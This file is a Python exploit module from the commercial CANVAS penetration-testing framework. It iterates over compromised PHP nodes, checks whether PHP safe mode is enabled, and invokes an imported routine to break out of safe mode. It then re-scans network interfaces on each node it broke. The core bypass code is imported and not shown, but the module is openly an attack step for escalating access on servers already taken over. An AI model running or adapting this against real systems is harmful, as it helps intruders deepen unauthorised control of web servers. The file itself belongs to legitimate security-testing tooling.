#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
import time

from exploitutils import *
from canvasexploit import canvasexploit
import canvasengine

from shelllistener import *
import unixShellNode

NAME                         = "usort_safemode"
DESCRIPTION                  = "Break PHP Safemode with Usort Vulnerability"
DOCUMENTATION                = {}
DOCUMENTATION["Date public"] = "12/10/2009"
DOCUMENTATION["CVE Name"]    = "N/A"
VERSION                      = "1.0"
GTK2_DIALOG                  = "dialog.glade2"
PROPERTY                     = {}
PROPERTY['TYPE']             = "Exploit"
PROPERTY['SITE']             = "Local"
PROPERTY['ARCH']             = [ ["PHP", "all"] ]

NOTES                        = """
I'm not sure when this was fixed.
"""

from ExploitTypes.php_break_safemode import php_break_safemode
from ExploitTypes.localexploit import LocalExploit

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.use_local_interface = False

    def getargs(self):
        #no args needed :>
        return 
    
    def run(self):
        """
        This run happens on all nodes selected
        """
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()
        broke_number=0
        for node in self.argsDict["passednodes"]:            
            type = node.nodetype
            nodename=node.getname()
            caps= node.capabilities
            if "PHP" not in caps:
                self.log("Node %s not a PHP node..."%nodename)
                continue
            #we are a PHP node
            safe_mode = node.shell.getPHPIniVal("safe_mode")
            if not safe_mode:
                self.log("No need to break this node's safe mode!")
                continue
            self.log("Safe mode is enabled - attempting to break out!")
            breaker = php_break_safemode(node.shell)
            ret = breaker.run_exploits()
            if ret:
                broke_number+=1
                self.log("We broke safemode!")
                #let's reget the interfaces!
                self.log("Re-getting interfaces for node %s"%nodename)
                node.findInterfaces() #finding interfaces should be a module as well, in case the user wants to get them
            else:
                self.log("Failed to break safemode on node %s!"%nodename)
                
        self.log("Broke out of %d PHP safe modes!"%broke_number)
        if broke_number:
            return 1
        else:
            return 0
    
if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"
    
